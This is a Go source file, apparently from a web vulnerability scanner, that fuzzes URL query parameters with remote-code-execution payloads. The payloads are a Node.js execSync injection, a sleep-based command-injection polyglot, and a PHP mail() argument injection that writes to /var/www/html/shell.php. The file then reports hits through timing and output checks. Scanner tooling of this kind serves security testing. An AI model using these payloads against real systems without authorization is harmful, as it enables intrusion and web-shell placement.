package rce

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/yupiyy/bhyakugan/internal/core"
	"github.com/yupiyy/bhyakugan/internal/utils"
)

type RCEPayload struct {
	Name    string
	Payload string
	Check   string 
	IsTime  bool
}

var RCEPayloads = []RCEPayload{
	{"JS Framework RCE (Node.js)", "process.mainModule.require('child_process').execSync('id').toString()", "uid=", false},
	{"Command Injection Polyglot", "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}", "", true},
	{"PHP mail() RCE", "hacker@example.com -OQueueDirectory=/tmp/ -X/var/www/html/shell.php", "", false},
	{"OS Command Injection (sleep)", "|| sleep 9", "", true},
}

func Scan(baseURL string, client *http.Client, ctx core.ScanContext, onFound func(core.Finding)) {
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 5)
	var foundMu sync.Mutex
	isFound := false

	u, _ := url.Parse(baseURL)
	q := u.Query()

	evalParams := []string{"code", "eval", "query", "cmd", "exec", "q"}
	testParams := make(map[string]string)
	
	if len(q) == 0 {
		if strings.Contains(baseURL, "api") || strings.Contains(baseURL, "eval") {
			for _, ep := range evalParams { testParams[ep] = "1" }
		}
	} else {
		for param := range q { testParams[param] = q.Get(param) }
	}

	for _, p := range RCEPayloads {
		if isFound { break }
		if strings.Contains(p.Name, "Node.js") && ctx.Language != "node" && ctx.Language != "unknown" { continue }

		for paramName := range testParams {
			wg.Add(1)
			go func(payload RCEPayload, targetParam string) {
				defer wg.Done()
				semaphore <- struct{}{}
				defer func() { <-semaphore }()

				if isFound { return }

				fuzzU, _ := url.Parse(baseURL)
				fuzzQ := fuzzU.Query()
				for k, v := range testParams { fuzzQ.Set(k, v) }
				fuzzQ.Set(targetParam, payload.Payload)
				fuzzU.RawQuery = fuzzQ.Encode()
				target := fuzzU.String()

				start := time.Now()
				req, errReq := http.NewRequest("GET", target, nil)
				if errReq != nil { return }
				utils.SetDefaultHeaders(req, target)
				resp, err := client.Do(req)
				duration := time.Since(start).Seconds()

				if err != nil { return }
				defer resp.Body.Close()

				body, _ := io.ReadAll(resp.Body)
				bodyStr := string(body)

				if payload.IsTime {
					if duration >= 9.0 {
						// Verification
						start2 := time.Now()
						req2, _ := http.NewRequest("GET", target, nil)
						utils.SetDefaultHeaders(req2, target)
						client.Do(req2)
						if time.Since(start2).Seconds() >= 9.0 {
							foundMu.Lock()
							if !isFound {
								isFound = true
								onFound(core.Finding{Type: "Remote Code Execution (RCE)", Target: target, Detail: "Confirmed via Time-Based Injection", Severity: "Critical"})
							}
							foundMu.Unlock()
						}
					}
				} else if payload.Check != "" && strings.Contains(bodyStr, payload.Check) {
					if strings.Count(bodyStr, payload.Check) > strings.Count(payload.Payload, payload.Check) {
						foundMu.Lock()
						if !isFound {
							isFound = true
							onFound(core.Finding{Type: "Remote Code Execution (RCE)", Target: target, Detail: fmt.Sprintf("Confirmed via %s", payload.Name), Severity: "Critical"})
						}
						foundMu.Unlock()
					}
				}
			}(p, paramName)
		}
	}
	wg.Wait()
}
